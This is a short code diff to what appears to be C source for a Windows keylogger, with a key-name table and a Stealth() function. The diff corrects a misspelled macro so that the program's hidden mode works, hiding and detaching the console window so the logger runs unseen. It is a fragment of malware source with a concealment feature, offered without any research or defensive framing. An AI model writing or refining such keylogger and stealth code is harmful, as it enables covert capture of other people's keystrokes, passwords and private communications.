@@ -6,7 +6,7 @@
 #include <string.h>
 #include <stdbool.h>
 
-#define hiden    //hiden/visable
+#define hidden    //hiden/visable
 
 const char* keyname[] = {
      [VK_BACK] = "[BACKSPACE]",
@@ -128,7 +128,7 @@ void Stealth() {
     #if defined visible
         ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
     #endif
-    #if defined hiden
+    #if defined hidden
         ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
         FreeConsole();
     #endif
